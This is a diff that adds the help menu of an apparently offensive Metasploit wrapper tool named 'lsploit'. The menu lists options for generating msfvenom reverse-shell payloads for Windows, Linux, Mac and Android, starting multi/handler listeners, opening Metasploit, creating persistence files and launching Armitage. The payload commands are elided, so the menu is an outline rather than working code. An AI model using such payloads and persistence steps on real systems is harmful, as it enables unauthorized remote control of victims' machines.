@@ -1,0 +1,31 @@
+               The Help Manu
+Option:          Description:
+
+1:		 Creates a playload for all systems using msfvenom
+		 Windows. -p windows/meterpreter/reverse_tcp ... -f exe
+		 Linux.   -p linux/x86/meterpreter/reverse_tcp ... -f elf
+		 Mac.	  -p osx/x86/shell_reverse_tcp ... -f macho
+		 Android. -p android/meterpreter/reverse_tcp ...R
+
+2:		 Crafts a LISTENER
+		 Uses (exploit/multi/handler)
+		 Windows. xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter.rc &
+		 Linux.   xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_linux.rc
+		 Mac.     xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_mac.rc
+		 Android. xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_droid.rc
+		
+3:		 Drops into metaploit
+		 use exploit/multi/handler
+
+4:		 A persistance generator
+		 Creates persistance files
+                 For Mac (/Applications/Utilities/)
+		 For Android (Creates a MainActivity.. android.sh script)
+
+5:		 Armitage Launcher
+		 armitage should be in /opt/armitage for the script to run
+
+x		 prints this screen
+
+
+		  
